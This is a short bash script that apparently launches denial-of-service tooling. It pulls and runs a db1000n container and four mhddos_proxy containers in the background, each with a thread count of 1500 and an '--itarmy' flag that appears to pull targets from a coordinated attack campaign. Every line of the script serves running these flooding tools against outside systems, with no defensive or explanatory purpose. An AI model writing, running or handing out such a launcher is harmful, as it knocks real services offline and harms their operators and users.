#!/bin/bash

docker stop $(docker ps -a -q --filter="name=db1000n")
docker run --rm -it -d --name=db1000n --pull always ghcr.io/arriven/db1000n

docker stop $(docker ps -a -q --filter="name=mhddos")
docker run -it -d --rm --name=mhddos --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy

docker stop $(docker ps -a -q --filter="name=mhddos1")
docker run -it -d --rm --name=mhddos1 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy


docker stop $(docker ps -a -q --filter="name=mhddos2")
docker run -it -d --rm --name=mhddos2 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy

docker stop $(docker ps -a -q --filter="name=mhddos3")
docker run -it -d --rm --name=mhddos3 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
